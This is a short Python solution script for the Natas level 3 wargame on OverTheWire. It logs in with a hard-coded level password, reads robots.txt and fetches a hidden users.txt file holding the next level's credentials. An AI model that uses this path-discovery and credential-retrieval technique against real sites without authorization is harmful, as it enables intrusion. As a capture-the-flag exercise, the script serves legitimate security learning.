import requests

url= "http://natas3.natas.labs.overthewire.org"

s=requests.Session()
s.auth=('natas3','sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14')
r= s.get(url+"/robots.txt")
r= s.get(url+"/s3cr3t/users.txt")
print(r.text)

#The hint " Not even Google will find it this time..." reminds for crawling webs of SEO with 
#relating to end-point robots.txt


